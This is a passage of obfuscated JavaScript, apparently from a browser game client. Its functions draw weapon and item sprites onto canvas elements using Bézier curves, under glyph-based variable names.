			Δ.bezierCurveTo(ᐃ * 1, ᐃ * 77, ᐃ * 4, 73 * ᐃ, ᐃ * ⵠΔⵠΔⵠΔⵠ, 60 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ᐃⵠΔⵠΔΔᐃ, ᐃ * 50, ᐃΔΔΔ * ᐃ, 32 * ᐃ, ᐃΔⲆᐃᐃΔᐃ * ᐃ, 27 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 26, ᐃ * ⲆᐃΔⵠΔ, ᐃ * 26, 24 * ᐃ, 31 * ᐃ, ᐃᐃⲆⵠⵠ * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ], Ⲇᐃ[ΔΔΔ], ⵠᐃᐃⲆ);
			return Ⲇⵠ
		}

		function ΔⵠⵠᐃⵠᐃΔ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 151;
			Ⲇⵠ.height = 80 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(133 * ᐃ, 54 * ᐃ);
			Δ.bezierCurveTo(136 * ᐃ, ᐃ * ᐃⵠⲆΔΔ, ᐃ * 129, ᐃ * 18, 114 * ᐃ, ⵠᐃᐃΔⲆ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 51, 0 * ᐃ, 36 * ᐃ, 16 * ᐃ, 34 * ᐃ, 16 * ᐃ);
			Δ.bezierCurveTo(ᐃ * Δᐃⵠⵠⵠ, 28 * ᐃ, ᐃ * 22, 56 * ᐃ, ᐃ * 21, 57 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃⵠ], Ⲇᐃ[3], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 130, ᐃ * 40);
			Δ.bezierCurveTo(ᐃ * 132, ᐃ * 35, 132 * ᐃ, ᐃ * 30, 132 * ᐃ, ᐃ * 29);
			Δ.bezierCurveTo(ᐃ * 145, ᐃ * 38, 144 * ᐃ, ᐃ * 43, ᐃ * 137, 54 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ], Ⲇᐃ[ᐃᐃⵠ], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(20 * ᐃ, 33 * ᐃ);
			Δ.bezierCurveTo(24 * ᐃ, ᐃ * 44, ᐃ * 215, ᐃ * 39, 23 * ᐃ, ᐃ * 44);
			Δ.bezierCurveTo(ᐃ * 19, ᐃ * 49, ᐃ * 19, ᐃ * 49, ᐃ * 15, 54 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 4, ᐃ * 43, ᐃ * ⲆⵠΔΔᐃ, ᐃ * 35, ᐃ * ᐃΔᐃⲆⵠ, 32 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ], Ⲇᐃ[1], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 18, ᐃ * 52);
			Δ.bezierCurveTo(24 * ᐃ, 31 * ᐃ, 34 * ᐃ, 25 * ᐃ, 75 * ᐃ, 23 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 130, ᐃ * 24, 129 * ᐃ, ᐃ * 32, 134 * ᐃ, 51 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 138, ᐃ * 70, ᐃ * 126, 72 * ᐃ, ᐃ * 90, 73 * ᐃ);
			Δ.bezierCurveTo(18 * ᐃ, 72 * ᐃ, 15 * ᐃ, 68 * ᐃ, ᐃⲆⲆⵠⵠΔΔ * ᐃ, 54 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], ⵠΔᐃΔ);
			return Ⲇⵠ
		}

		function ΔΔⲆⵠⲆΔΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 43 * ᐃ;
			Ⲇⵠ.height = 209 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠΔⲆ;
			Δ.translate(ΔΔⵠ, ⲆΔΔᐃᐃ * ᐃ);
			Δ.translate(ᐃ * 5, ᐃ * 5);
			Δ.save();
			Δ.translate(ᐃ * 21, 102.5 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -4, ᐃ * -76.5, 8 * ᐃ, ᐃ * 163, ⲆΔΔᐃᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(0, ᐃ * ⵠᐃⲆⲆΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 20, ⲆⵠⲆⲆᐃ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 25, 25.5 * ᐃ, ᐃ * 25, 25.5 * ᐃ, ᐃ * 30, ᐃ * 41);
			Δ.bezierCurveTo(25.5 * ᐃ, ᐃ * 38.5, ᐃ * 25.5, 38.5 * ᐃ, 21 * ᐃ, 36 * ᐃ);
			Δ.bezierCurveTo(16 * ᐃ, ᐃ * 38.5, ᐃ * ᐃⲆⲆΔΔⵠΔ, 38.5 * ᐃ, 11 * ᐃ, ᐃ * 41);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 21, ᐃ * Ⲇᐃⵠ);
			Δ.bezierCurveTo(ᐃ * 28, ᐃ * ᐃⲆᐃⲆⲆᐃᐃ, 28 * ᐃ, ᐃ * ᐃᐃΔⲆⲆΔⲆ, ᐃ * 35, 35 * ᐃ);
			Δ.bezierCurveTo(28.5 * ᐃ, 32 * ᐃ, 28.5 * ᐃ, ᐃ * 32, 22 * ᐃ, ᐃ * 29);
			Δ.bezierCurveTo(14.5 * ᐃ, 32.5 * ᐃ, ᐃ * 14.5, 32.5 * ᐃ, ᐃ * ᐃᐃⵠⵠⵠ, 36 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ΔΔⲆᐃⲆΔⵠ * ᐃ, 146 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 21, 146 * ᐃ, ᐃ * 21, ᐃ * 146, 28 * ᐃ, ᐃ * 146);
			Δ.bezierCurveTo(ᐃ * 27.5, 147.5 * ᐃ, ᐃ * 27.5, ᐃ * 147.5, 27 * ᐃ, 149 * ᐃ);
			Δ.bezierCurveTo(27 * ᐃ, ᐃ * 160, 27 * ᐃ, ᐃ * 160, ᐃ * 27, ᐃ * 171);
			Δ.bezierCurveTo(ᐃ * 27.5, 171.5 * ᐃ, ᐃ * 27.5, ᐃ * 171.5, 28 * ᐃ, ᐃ * 172);
			Δ.bezierCurveTo(21 * ᐃ, ᐃ * 172, ᐃ * 21, ᐃ * 172, ΔⲆᐃᐃᐃ * ᐃ, 172 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ⲆⵠⵠᐃⲆⲆΔ, 171.5 * ᐃ, ⵠⲆⲆⵠΔⵠⲆ * ᐃ, ᐃ * 171.5, 14 * ᐃ, ᐃ * 171);
			Δ.bezierCurveTo(14.5 * ᐃ, ᐃ * 171.5, 14.5 * ᐃ, 171.5 * ᐃ, 15 * ᐃ, ᐃ * 172);
			Δ.bezierCurveTo(ᐃᐃⵠΔⲆⵠᐃ * ᐃ, 160.5 * ᐃ, ᐃ * ΔⲆⵠΔⲆⲆⵠ, 160.5 * ᐃ, ᐃ * ΔⲆᐃᐃΔΔᐃ, 149 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 21, ᐃ * 6);
			Δ.bezierCurveTo(26.5 * ᐃ, 18.5 * ᐃ, ᐃ * 26.5, 18.5 * ᐃ, ᐃ * 32, 31 * ᐃ);
			Δ.bezierCurveTo(27 * ᐃ, 29 * ᐃ, ᐃ * 27, ᐃ * 29, ᐃ * 22, 27 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
			Δ.translate(ΔΔⵠⵠ, ᐃ * -ⵠΔⵠⵠᐃ);
			Δ.globalAlpha = ΔΔᐃⵠ;
			Δ.translate(0, ᐃ * ⵠⵠⲆΔΔ);
			Δ.translate(-ⵠⲆᐃᐃ * ᐃ, ᐃ * -5);
			Δ.save();
			Δ.translate(21 * ᐃ, ᐃ * 102.5);
			Ⲇᐃᐃ(Δ, ᐃ * -4, ᐃ * -76.5, ᐃ * ⲆⵠⵠⲆΔ, ᐃ * 163, ᐃ * ⲆⲆⲆΔᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ⵠΔΔᐃΔ * ᐃ);
			Δ.translate(0, ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * ⲆⲆⲆⵠΔ, ⲆⲆᐃΔΔ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 25, 25.5 * ᐃ, ᐃ * 25, ᐃ * 25.5, 30 * ᐃ, ᐃ * 41);
			Δ.bezierCurveTo(ᐃ * 25.5, 38.5 * ᐃ, ᐃ * 25.5, 38.5 * ᐃ, ᐃ * 21, ᐃ * 36);
			Δ.bezierCurveTo(16 * ᐃ, 38.5 * ᐃ, ᐃ * 16, 38.5 * ᐃ, ᐃ * ΔΔΔΔⲆⵠⲆ, 41 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(21 * ᐃ, ᐃ * 1);
			Δ.bezierCurveTo(ᐃ * 28, ᐃ * 18, ᐃ * 28, ᐃ * 18, 35 * ᐃ, 35 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 28.5, 32 * ᐃ, 28.5 * ᐃ, 32 * ᐃ, ᐃ * 22, 29 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 14.5, 32.5 * ᐃ, ᐃ * 14.5, 32.5 * ᐃ, ᐃ * ΔⲆΔᐃᐃ, 36 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[ΔᐃⲆᐃ], ᐃ * 4);
			Δ.translate(0, ⲆⲆⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ΔⵠⵠⲆⵠᐃᐃ * ᐃ, ᐃ * 146);
			Δ.bezierCurveTo(21 * ᐃ, ᐃ * 146, 21 * ᐃ, ᐃ * 146, ᐃ * 28, 146 * ᐃ);
			Δ.bezierCurveTo(27.5 * ᐃ, 147.5 * ᐃ, ᐃ * 27.5, ᐃ * 147.5, ᐃ * 27, ᐃ * 149);
			Δ.bezierCurveTo(ᐃ * 27, 160 * ᐃ, ᐃ * 27, 160 * ᐃ, ᐃ * 27, ᐃ * 171);
			Δ.bezierCurveTo(27.5 * ᐃ, ᐃ * 171.5, 27.5 * ᐃ, ᐃ * 171.5, ᐃ * 28, ᐃ * 172);
			Δ.bezierCurveTo(ᐃ * 21, 172 * ᐃ, ᐃ * 21, ᐃ * 172, ᐃ * ⲆΔⲆⵠᐃ, ᐃ * 172);
			Δ.bezierCurveTo(ⵠΔΔⵠᐃᐃᐃ * ᐃ, 171.5 * ᐃ, ⲆΔᐃΔⲆΔΔ * ᐃ, 171.5 * ᐃ, ᐃ * ⵠⲆⲆⵠΔⵠⲆ, ᐃ * 171);
			Δ.bezierCurveTo(ᐃ * 14.5, 171.5 * ᐃ, 14.5 * ᐃ, 171.5 * ᐃ, ᐃ * 15, ᐃ * 172);
			Δ.bezierCurveTo(ᐃ * ⵠⵠⵠⵠΔ, ᐃ * 160.5, ᐃ * 15, 160.5 * ᐃ, ᐃ * ⲆᐃⲆΔⲆ, 149 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δⵠⵠⵠ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 21, ᐃⵠΔⵠⲆⲆⲆ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 26.5, ᐃ * 18.5, ᐃ * 26.5, ᐃ * 18.5, 32 * ᐃ, ᐃ * 31);
			Δ.bezierCurveTo(ᐃ * 27, 29 * ᐃ, ᐃ * 27, 29 * ᐃ, ᐃ * 22, 27 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			return Ⲇⵠ
		}

		function ⵠᐃᐃᐃΔᐃᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 106;
			Ⲇⵠ.height = ᐃ * 681;
			Δ.translate(ᐃ * 20, ᐃΔⲆⵠᐃ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.save();
			Δ.translate(ᐃ * 52.5, 395 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, ᐃ * -11.5, ᐃ * -226, ᐃ * 23, 452 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(35 * ᐃ, ᐃ * 588);
			Δ.bezierCurveTo(ᐃ * 47, 596 * ᐃ, 61 * ᐃ, ᐃ * 594, ᐃ * 69, 588 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 79, ᐃ * 615, 78 * ᐃ, ᐃ * 632, 59 * ᐃ, ᐃ * 643);
			Δ.bezierCurveTo(ᐃ * 41, 650 * ᐃ, ᐃ * 27, ᐃ * 632, ᐃ * 30, 610 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(52 * ᐃ, 135 * ᐃ);
			Δ.bezierCurveTo(61.5 * ᐃ, 142 * ᐃ, 61.5 * ᐃ, 142 * ᐃ, ᐃ * 71, 149 * ᐃ);
			Δ.bezierCurveTo(69.5 * ᐃ, ᐃ * 166, ᐃ * 69.5, 166 * ᐃ, ᐃ * 68, 183 * ᐃ);
			Δ.bezierCurveTo(60.5 * ᐃ, ᐃ * 187.5, ᐃ * 60.5, 187.5 * ᐃ, 53 * ᐃ, ᐃ * 192);
			Δ.bezierCurveTo(ᐃ * 45, ᐃ * 187.5, 45 * ᐃ, 187.5 * ᐃ, 37 * ᐃ, ᐃ * 183);
			Δ.bezierCurveTo(ᐃ * 35.5, 167 * ᐃ, ᐃ * 35.5, 167 * ᐃ, ᐃ * 34, ᐃ * 151);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(64 * ᐃ, 150 * ᐃ);
			Δ.bezierCurveTo(63 * ᐃ, ᐃ * 164, 63 * ᐃ, ᐃ * 164, ᐃ * 62, ᐃ * 178);
			Δ.bezierCurveTo(58 * ᐃ, 181 * ᐃ, ᐃ * 58, 181 * ᐃ, 54 * ᐃ, ᐃ * 184);
			Δ.bezierCurveTo(48.5 * ᐃ, ᐃ * 181.5, ᐃ * 48.5, ᐃ * 181.5, 43 * ᐃ, 179 * ᐃ);
			Δ.bezierCurveTo(42 * ᐃ, ᐃ * 164.5, ᐃ * 42, 164.5 * ᐃ, 41 * ᐃ, 150 * ᐃ);
			Δ.bezierCurveTo(46 * ᐃ, 152.5 * ᐃ, 46 * ᐃ, ᐃ * 152.5, ᐃ * 51, 155 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 52, 39 * ᐃ);
			Δ.bezierCurveTo(65.5 * ᐃ, 82 * ᐃ, ᐃ * 65.5, 82 * ᐃ, 79 * ᐃ, 125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 66, ᐃ * 137.5, ᐃ * 66, 137.5 * ᐃ, ᐃ * 53, ᐃ * 150);
			Δ.bezierCurveTo(ᐃ * 39, ᐃ * 138, 39 * ᐃ, ᐃ * 138, 25 * ᐃ, ᐃ * 126);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 52, 64 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 60, 92.5 * ᐃ, ᐃ * 60, ᐃ * 92.5, ᐃ * 68, ᐃ * 121);
			Δ.bezierCurveTo(ᐃ * 61, 127.5 * ᐃ, 61 * ᐃ, ᐃ * 127.5, 54 * ᐃ, 134 * ᐃ);
			Δ.bezierCurveTo(46.5 * ᐃ, 127.5 * ᐃ, ᐃ * 46.5, ᐃ * 127.5, ᐃ * 39, 121 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(-20 * ᐃ, ᐃ * -ⵠⲆⲆⲆⲆ);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(ᐃ * 52.5, 395 * ᐃ);
			Δ.rotate(ⲆΔⵠ);
			Ⲇᐃᐃ(Δ, ᐃ * -11.5, -226 * ᐃ, ᐃ * 23, 452 * ᐃ, ⲆΔΔᐃᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 35, ᐃ * 588);
			Δ.bezierCurveTo(47 * ᐃ, ᐃ * 596, 61 * ᐃ, ᐃ * 594, 69 * ᐃ, ᐃ * 588);
			Δ.bezierCurveTo(ᐃ * 79, 615 * ᐃ, ᐃ * 78, ᐃ * 632, ᐃ * 59, 643 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 41, ᐃ * 650, 27 * ᐃ, 632 * ᐃ, 30 * ᐃ, 610 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠⲆ], Ⲇᐃ[4], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(52 * ᐃ, 135 * ᐃ);
			Δ.bezierCurveTo(61.5 * ᐃ, ᐃ * 142, ᐃ * 61.5, 142 * ᐃ, ᐃ * 71, 149 * ᐃ);
			Δ.bezierCurveTo(69.5 * ᐃ, ᐃ * 166, 69.5 * ᐃ, 166 * ᐃ, ᐃ * 68, 183 * ᐃ);
			Δ.bezierCurveTo(60.5 * ᐃ, 187.5 * ᐃ, 60.5 * ᐃ, ᐃ * 187.5, 53 * ᐃ, 192 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 45, ᐃ * 187.5, 45 * ᐃ, ᐃ * 187.5, ᐃ * 37, 183 * ᐃ);
			Δ.bezierCurveTo(35.5 * ᐃ, 167 * ᐃ, 35.5 * ᐃ, 167 * ᐃ, 34 * ᐃ, 151 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ], Ⲇᐃ[ΔΔⵠⵠΔ], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(64 * ᐃ, 150 * ᐃ);
			Δ.bezierCurveTo(63 * ᐃ, 164 * ᐃ, ᐃ * 63, 164 * ᐃ, ᐃ * 62, ᐃ * 178);
			Δ.bezierCurveTo(58 * ᐃ, 181 * ᐃ, 58 * ᐃ, 181 * ᐃ, ᐃ * 54, ᐃ * 184);
			Δ.bezierCurveTo(48.5 * ᐃ, ᐃ * 181.5, ᐃ * 48.5, 181.5 * ᐃ, 43 * ᐃ, 179 * ᐃ);
			Δ.bezierCurveTo(42 * ᐃ, ᐃ * 164.5, ᐃ * 42, ᐃ * 164.5, 41 * ᐃ, 150 * ᐃ);
			Δ.bezierCurveTo(46 * ᐃ, ᐃ * 152.5, 46 * ᐃ, ᐃ * 152.5, ᐃ * 51, ᐃ * 155);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(52 * ᐃ, ᐃ * 39);
			Δ.bezierCurveTo(65.5 * ᐃ, 82 * ᐃ, 65.5 * ᐃ, 82 * ᐃ, 79 * ᐃ, ᐃ * 125);
			Δ.bezierCurveTo(ᐃ * 66, ᐃ * 137.5, ᐃ * 66, 137.5 * ᐃ, ᐃ * 53, 150 * ᐃ);
			Δ.bezierCurveTo(39 * ᐃ, ᐃ * 138, ᐃ * 39, ᐃ * 138, ᐃ * 25, 126 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆᐃ], Ⲇᐃ[7], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(52 * ᐃ, ᐃ * 64);
			Δ.bezierCurveTo(60 * ᐃ, ᐃ * 92.5, 60 * ᐃ, ᐃ * 92.5, ᐃ * 68, 121 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 61, ᐃ * 127.5, ᐃ * 61, 127.5 * ᐃ, 54 * ᐃ, 134 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 46.5, 127.5 * ᐃ, 46.5 * ᐃ, 127.5 * ᐃ, 39 * ᐃ, 121 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			return Ⲇⵠ
		}

		function ⵠᐃⲆᐃΔΔⵠΔⵠ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 86;
			Ⲇⵠ.height = ᐃ * 45;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * ᐃΔᐃΔᐃΔᐃ, ᐃ * 15);
			Δ.bezierCurveTo(ΔⲆⵠⵠᐃⲆΔ * ᐃ, ᐃ * 15, ᐃ * 19.5, ⵠⵠⲆΔⵠⵠΔ * ᐃ, 24 * ᐃ, Ⲇᐃᐃⵠ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 41, ΔⵠᐃⲆ * ᐃ, 41 * ᐃ, ⲆⲆΔᐃ * ᐃ, 58 * ᐃ, ᐃ * ⲆⲆΔᐃ);
			Δ.bezierCurveTo(64 * ᐃ, 13 * ᐃ, 61 * ᐃ, ⵠⲆⲆΔΔ * ᐃ, ᐃ * 65, 13 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠⲆΔ], ΔⲆᐃⵠᐃ);
			Δ.save();
			Δ.translate(ᐃ * 43, 27 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -40 * ᐃ, -ᐃΔⲆᐃᐃΔᐃ * ᐃ, ᐃ * 80, ᐃ * 30, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔⵠΔⵠ], 4);
			Δ.save();
			Δ.translate(ᐃ * 43, ᐃ * 33);
			Δ.rotate(ᐃⵠⲆ);
			Ⲇᐃᐃ(Δ, -17 * ᐃ, ᐃ * -4.5, ᐃ * 34, ᐃ * ⵠΔᐃⲆᐃᐃⲆ, ᐃ * ᐃⵠᐃΔⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠΔⵠΔ], ⲆⲆⲆΔ);
			return Ⲇⵠ
		}

		function ΔⲆᐃⵠⲆⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 108 * ᐃ;
			Ⲇⵠ.height = ᐃ * 669;
			Δ.translate(ᐃ * ᐃᐃⵠⵠⲆ, ᐃ * ⵠΔΔⲆⲆ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔⲆⵠ;
			Δ.save();
			Δ.translate(ᐃ * 54, 389.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -ⲆᐃⲆΔⲆ * ᐃ, -228.5 * ᐃ, ᐃ * 30, ᐃ * 457, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(35 * ᐃ, ᐃ * 579);
			Δ.bezierCurveTo(47 * ᐃ, 587 * ᐃ, ᐃ * 61, 584 * ᐃ, 71 * ᐃ, 579 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 75, 597.5 * ᐃ, 75 * ᐃ, 597.5 * ᐃ, ᐃ * 79, ᐃ * 616);
			Δ.bezierCurveTo(ᐃ * 66.5, ᐃ * 628, 66.5 * ᐃ, ᐃ * 628, 54 * ᐃ, 640 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 41, 628.5 * ᐃ, 41 * ᐃ, 628.5 * ᐃ, ᐃ * 28, ᐃ * 617);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(30 * ᐃ, 141 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 40, ᐃ * 136, 40 * ᐃ, ᐃ * 136, ᐃ * 50, 131 * ᐃ);
			Δ.bezierCurveTo(63 * ᐃ, 136 * ᐃ, 63 * ᐃ, ᐃ * 136, 76 * ᐃ, ᐃ * 141);
			Δ.bezierCurveTo(72.5 * ᐃ, ᐃ * 161.5, ᐃ * 72.5, 161.5 * ᐃ, 69 * ᐃ, ᐃ * 182);
			Δ.bezierCurveTo(61.5 * ᐃ, 186.5 * ᐃ, ᐃ * 61.5, ᐃ * 186.5, 54 * ᐃ, 191 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 45, 186.5 * ᐃ, ᐃ * 45, ᐃ * 186.5, ᐃ * 36, ᐃ * 182);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(42 * ᐃ, ᐃ * 152);
			Δ.bezierCurveTo(ᐃ * 53, ᐃ * 152, 53 * ᐃ, 152 * ᐃ, ᐃ * 64, 152 * ᐃ);
			Δ.bezierCurveTo(62 * ᐃ, 171 * ᐃ, ᐃ * 62, ᐃ * 176, 55 * ᐃ, 177 * ᐃ);
			Δ.bezierCurveTo(42 * ᐃ, ᐃ * 176, ᐃ * 45, 174 * ᐃ, ᐃ * 42, 152 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 52, ᐃ * 28);
			Δ.bezierCurveTo(67.5 * ᐃ, ᐃ * 55, ᐃ * 67.5, 55 * ᐃ, ᐃ * 83, 82 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 80, 106.5 * ᐃ, ᐃ * 80, ᐃ * 106.5, ᐃ * 77, 131 * ᐃ);
